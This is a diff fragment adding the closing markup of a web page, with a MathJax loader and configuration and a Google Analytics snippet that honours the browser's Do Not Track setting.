+</p></div></section><script defer type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity="sha384-e/4/LvThKH1gwzXhdbY2AsjR3rm7LHWyhIG5C0jiRfn8AN2eTN5ILeztWw0H9jmN" crossorigin="anonymous"></script>
+        <script
+            type="text/x-mathjax-config">MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });</script>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-W1PPPTDK5L"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-W1PPPTDK5L');
+        }
+      </script></body>
+
+</html>
